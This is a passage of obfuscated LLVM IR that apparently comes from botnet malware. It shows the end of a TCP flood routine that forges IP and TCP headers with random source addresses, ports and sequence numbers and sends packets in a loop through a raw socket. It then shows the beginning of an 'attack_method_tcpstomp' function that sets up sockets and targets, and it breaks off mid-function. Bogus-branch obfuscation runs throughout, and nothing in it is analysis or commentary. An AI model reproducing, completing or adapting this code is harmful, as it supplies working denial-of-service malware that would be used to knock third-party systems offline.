  %391 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i64 1
  %393 = bitcast %struct.iphdr* %392 to %struct.tcphdr*
  store %struct.tcphdr* %393, %struct.tcphdr** %34, align 8
  %394 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i64 1
  %396 = bitcast %struct.tcphdr* %395 to i8*
  store i8* %396, i8** %35, align 8
  %397 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %398 = load i32, i32* %9, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %400, i32 0, i32 2
  %402 = load i8, i8* %401, align 4
  %403 = zext i8 %402 to i32
  %404 = icmp slt i32 %403, 32
  br i1 %404, label %405, label %442

; <label>:405:                                    ; preds = %383
  %406 = load i32, i32* @x.27
  %407 = load i32, i32* @y.28
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %405
  %414 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %415 = load i32, i32* %9, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 1
  %419 = load i32, i32* %418, align 4
  %420 = call i32 @ntohl(i32 %419) #7
  %421 = call i32 @rand_next()
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 2
  %427 = load i8, i8* %426, align 4
  %428 = zext i8 %427 to i32
  %429 = lshr i32 %421, %428
  %430 = add i32 %420, %429
  %431 = call i32 @htonl(i32 %430) #7
  %432 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 9
  store i32 %431, i32* %433, align 4
  %434 = load i32, i32* @x.27
  %435 = load i32, i32* @y.28
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart250, label %originalBB26alteredBB

originalBBpart250:                                ; preds = %originalBB26
  br label %442

; <label>:442:                                    ; preds = %originalBBpart250, %383
  %443 = load i32, i32* %28, align 4
  %444 = icmp eq i32 %443, -1
  br i1 %444, label %445, label %465

; <label>:445:                                    ; preds = %442
  %446 = load i32, i32* @x.27
  %447 = load i32, i32* @y.28
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %445
  %454 = call i32 @rand_next()
  %455 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 8
  store i32 %454, i32* %456, align 4
  %457 = load i32, i32* @x.27
  %458 = load i32, i32* @y.28
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %465

; <label>:465:                                    ; preds = %originalBBpart254, %442
  %466 = load i16, i16* %13, align 2
  %467 = zext i16 %466 to i32
  %468 = icmp eq i32 %467, 65535
  br i1 %468, label %469, label %475

; <label>:469:                                    ; preds = %465
  %470 = call i32 @rand_next()
  %471 = and i32 %470, 65535
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  br label %475

; <label>:475:                                    ; preds = %469, %465
  %476 = load i32, i32* @x.27
  %477 = load i32, i32* @y.28
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %475
  %484 = load i16, i16* %16, align 2
  %485 = zext i16 %484 to i32
  %486 = icmp eq i32 %485, 65535
  %487 = load i32, i32* @x.27
  %488 = load i32, i32* @y.28
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %486, label %495, label %501

; <label>:495:                                    ; preds = %originalBBpart258
  %496 = call i32 @rand_next()
  %497 = and i32 %496, 65535
  %498 = trunc i32 %497 to i16
  %499 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  store i16 %498, i16* %500, align 4
  br label %501

; <label>:501:                                    ; preds = %495, %originalBBpart258
  %502 = load i16, i16* %17, align 2
  %503 = zext i16 %502 to i32
  %504 = icmp eq i32 %503, 65535
  br i1 %504, label %505, label %511

; <label>:505:                                    ; preds = %501
  %506 = call i32 @rand_next()
  %507 = and i32 %506, 65535
  %508 = trunc i32 %507 to i16
  %509 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 1
  store i16 %508, i16* %510, align 2
  br label %511

; <label>:511:                                    ; preds = %505, %501
  %512 = load i32, i32* %18, align 4
  %513 = icmp eq i32 %512, 65535
  br i1 %513, label %514, label %518

; <label>:514:                                    ; preds = %511
  %515 = call i32 @rand_next()
  %516 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 2
  store i32 %515, i32* %517, align 4
  br label %518

; <label>:518:                                    ; preds = %514, %511
  %519 = load i32, i32* %19, align 4
  %520 = icmp eq i32 %519, 65535
  br i1 %520, label %521, label %525

; <label>:521:                                    ; preds = %518
  %522 = call i32 @rand_next()
  %523 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 3
  store i32 %522, i32* %524, align 4
  br label %525

; <label>:525:                                    ; preds = %521, %518
  %526 = load i8, i8* %27, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %547

; <label>:528:                                    ; preds = %525
  %529 = load i32, i32* @x.27
  %530 = load i32, i32* @y.28
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %528
  %537 = load i8*, i8** %35, align 8
  %538 = load i32, i32* %26, align 4
  call void @rand_str(i8* %537, i32 %538)
  %539 = load i32, i32* @x.27
  %540 = load i32, i32* @y.28
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %547

; <label>:547:                                    ; preds = %originalBBpart262, %525
  %548 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 0, i16* %549, align 2
  %550 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %551 = bitcast %struct.iphdr* %550 to i16*
  %552 = call zeroext i16 @checksum_generic(i16* %551, i32 20)
  %553 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  %555 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 6
  store i16 0, i16* %556, align 4
  %557 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %558 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %559 = bitcast %struct.tcphdr* %558 to i8*
  %560 = load i32, i32* %26, align 4
  %561 = sext i32 %560 to i64
  %562 = add i64 20, %561
  %563 = trunc i64 %562 to i16
  %564 = call zeroext i16 @htons(i16 zeroext %563) #7
  %565 = load i32, i32* %26, align 4
  %566 = sext i32 %565 to i64
  %567 = add i64 20, %566
  %568 = trunc i64 %567 to i32
  %569 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %557, i8* %559, i16 zeroext %564, i32 %568)
  %570 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 6
  store i16 %569, i16* %571, align 4
  %572 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 1
  %574 = load i16, i16* %573, align 2
  %575 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %576 = load i32, i32* %9, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %578, i32 0, i32 0
  %580 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %579, i32 0, i32 1
  store i16 %574, i16* %580, align 2
  %581 = load i32, i32* %10, align 4
  %582 = load i8*, i8** %32, align 8
  %583 = load i32, i32* %26, align 4
  %584 = sext i32 %583 to i64
  %585 = add i64 40, %584
  %586 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %587 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %588 = load i32, i32* %9, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 0
  %592 = bitcast %struct.sockaddr_in* %591 to %struct.sockaddr*
  store %struct.sockaddr* %592, %struct.sockaddr** %586, align 8
  %593 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %594 = load %struct.sockaddr*, %struct.sockaddr** %593, align 8
  %595 = call i64 @sendto(i32 %581, i8* %582, i64 %585, i32 16384, %struct.sockaddr* %594, i32 16)
  br label %596

; <label>:596:                                    ; preds = %547
  %597 = load i32, i32* %9, align 4
  %598 = add nsw i32 %597, 1
  store i32 %598, i32* %9, align 4
  br label %362

; <label>:599:                                    ; preds = %originalBBpart224
  %600 = load i32, i32* @x.27
  %601 = load i32, i32* @y.28
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %599
  %608 = load i32, i32* @x.27
  %609 = load i32, i32* @y.28
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %361

; <label>:616:                                    ; preds = %originalBBpart28, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %108
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %125
  store i32 1, i32* %9, align 4
  %617 = load i32, i32* %10, align 4
  %618 = bitcast i32* %9 to i8*
  %619 = call i32 @setsockopt(i32 %617, i32 0, i32 3, i8* %618, i32 4) #6
  %620 = icmp eq i32 %619, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %146
  %621 = load i32, i32* %10, align 4
  %622 = call i32 @close(i32 %621)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %218
  %623 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %624 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %625 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %624, i32 0, i32 4
  store i16 %623, i16* %625, align 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %341
  %626 = load i32, i32* %9, align 4
  %_ = sub i32 0, %626
  %gen = add i32 %_, 1
  %_15 = shl i32 %626, 1
  %_16 = sub i32 0, %626
  %gen17 = add i32 %_16, 1
  %_18 = shl i32 %626, 1
  %627 = add nsw i32 %626, 1
  store i32 %627, i32* %9, align 4
  br label %originalBB14

originalBB22alteredBB:                            ; preds = %originalBB22, %362
  %628 = load i32, i32* %9, align 4
  %629 = load i8, i8* %5, align 1
  %630 = zext i8 %629 to i32
  %631 = icmp slt i32 %628, %630
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %405
  %632 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %633 = load i32, i32* %9, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %632, i64 %634
  %636 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i32 0, i32 1
  %637 = load i32, i32* %636, align 4
  %638 = call i32 @ntohl(i32 %637) #7
  %639 = call i32 @rand_next()
  %640 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %641 = load i32, i32* %9, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %640, i64 %642
  %644 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %643, i32 0, i32 2
  %645 = load i8, i8* %644, align 4
  %646 = zext i8 %645 to i32
  %_27 = sub i32 %639, %646
  %gen28 = mul i32 %_27, %646
  %_29 = shl i32 %639, %646
  %_30 = sub i32 %639, %646
  %gen31 = mul i32 %_30, %646
  %_32 = sub i32 %639, %646
  %gen33 = mul i32 %_32, %646
  %_34 = sub i32 0, %639
  %gen35 = add i32 %_34, %646
  %_36 = sub i32 %639, %646
  %gen37 = mul i32 %_36, %646
  %_38 = sub i32 %639, %646
  %gen39 = mul i32 %_38, %646
  %_40 = sub i32 %639, %646
  %gen41 = mul i32 %_40, %646
  %647 = lshr i32 %639, %646
  %_42 = sub i32 0, %638
  %gen43 = add i32 %_42, %647
  %_44 = sub i32 %638, %647
  %gen45 = mul i32 %_44, %647
  %_46 = shl i32 %638, %647
  %_47 = sub i32 0, %638
  %gen48 = add i32 %_47, %647
  %648 = add i32 %638, %647
  %649 = call i32 @htonl(i32 %648) #7
  %650 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %651 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %650, i32 0, i32 9
  store i32 %649, i32* %651, align 4
  br label %originalBB26

originalBB52alteredBB:                            ; preds = %originalBB52, %445
  %652 = call i32 @rand_next()
  %653 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %654 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %653, i32 0, i32 8
  store i32 %652, i32* %654, align 4
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %475
  %655 = load i16, i16* %16, align 2
  %656 = zext i16 %655 to i32
  %657 = icmp eq i32 %656, 65535
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %528
  %658 = load i8*, i8** %35, align 8
  %659 = load i32, i32* %26, align 4
  call void @rand_str(i8* %658, i32 %659)
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %599
  br label %originalBB64
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %815

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %815

; <label>:114:                                    ; preds = %106
  %115 = load i32, i32* @x.29
  %116 = load i32, i32* @y.30
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %114
  store i32 0, i32* %9, align 4
  %123 = load i32, i32* @x.29
  %124 = load i32, i32* @y.30
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %131

; <label>:131:                                    ; preds = %652, %originalBBpart2
  %132 = load i32, i32* %9, align 4
  %133 = load i8, i8* %5, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %132, %134
  br i1 %135, label %136, label %655

; <label>:136:                                    ; preds = %131
  br label %137

; <label>:137:                                    ; preds = %631, %604, %136
  %138 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %138, i32* %26, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %140, label %157

; <label>:140:                                    ; preds = %137
  %141 = load i32, i32* @x.29
  %142 = load i32, i32* @y.30
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %140
  %149 = load i32, i32* @x.29
  %150 = load i32, i32* @y.30
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %652

; <label>:157:                                    ; preds = %137
  %158 = load i32, i32* %26, align 4
  %159 = load i32, i32* %26, align 4
  %160 = call i32 (i32, i32, ...) @fcntl(i32 %159, i32 3, i32 0)
  %161 = or i32 %160, 2048
  %162 = call i32 (i32, i32, ...) @fcntl(i32 %158, i32 4, i32 %161)
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = icmp slt i32 %170, 32
  br i1 %171, label %172, label %193

; <label>:172:                                    ; preds = %157
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #7
  %180 = call i32 @rand_next()
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = lshr i32 %180, %187
  %189 = add i32 %179, %188
  %190 = call i32 @htonl(i32 %189) #7
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %192 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %191, i32 0, i32 0
  store i32 %190, i32* %192, align 4
  br label %202

; <label>:193:                                    ; preds = %157
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 4
  br label %202

; <label>:202:                                    ; preds = %193, %172
  %203 = load i16, i16* %17, align 2
  %204 = zext i16 %203 to i32
  %205 = icmp eq i32 %204, 65535
  br i1 %205, label %206, label %227

; <label>:206:                                    ; preds = %202
  %207 = load i32, i32* @x.29
  %208 = load i32, i32* @y.30
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %206
  %215 = call i32 @rand_next()
  %216 = and i32 %215, 65535
  %217 = trunc i32 %216 to i16
  %218 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %217, i16* %218, align 2
  %219 = load i32, i32* @x.29
  %220 = load i32, i32* @y.30
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart212, label %originalBB6alteredBB

originalBBpart212:                                ; preds = %originalBB6
  br label %231

; <label>:227:                                    ; preds = %202
  %228 = load i16, i16* %17, align 2
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
